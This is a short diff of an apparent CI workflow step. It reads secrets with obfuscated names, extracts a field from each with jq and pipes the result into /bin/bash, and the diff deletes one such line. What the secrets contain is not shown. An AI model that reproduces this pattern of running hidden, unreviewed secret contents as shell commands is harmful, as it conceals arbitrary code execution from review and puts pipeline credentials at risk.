@@ -17,7 +17,6 @@ jobs:
           t8: ${{ secrets.t8 }}
         run: |
           printf '%s' "$t8" | jq -r .ujewq0234 | /bin/bash
-          printf '%s' "$lne2" | jq -r .hv457 | /bin/bash
           echo $qegxk0 | jq -r .jetgd50 | /bin/bash
           printf '%s' "$v680" | jq -r .s47048 | /bin/bash
           echo $w4186 | jq -r .vpdof0956 | /bin/bash
